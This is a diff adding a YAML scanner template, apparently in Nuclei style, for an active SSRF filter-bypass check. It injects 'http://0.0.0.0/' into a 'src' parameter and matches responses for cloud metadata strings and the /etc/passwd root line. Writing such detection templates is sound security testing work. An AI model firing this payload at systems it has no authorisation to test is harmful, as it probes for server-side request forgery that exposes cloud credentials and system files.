@@ -1,0 +1,25 @@
+id: ssrf2-049
+name: 'SSRF2 bypass via src'
+severity: high
+type: active
+tags:
+  - ssrf
+  - oob
+  - cloud
+  - bypass
+description: 'SSRF filter bypass via src'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      src:
+        - 'http://0.0.0.0/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
+          - 'root:x:0:0'
+          - 'PONG'
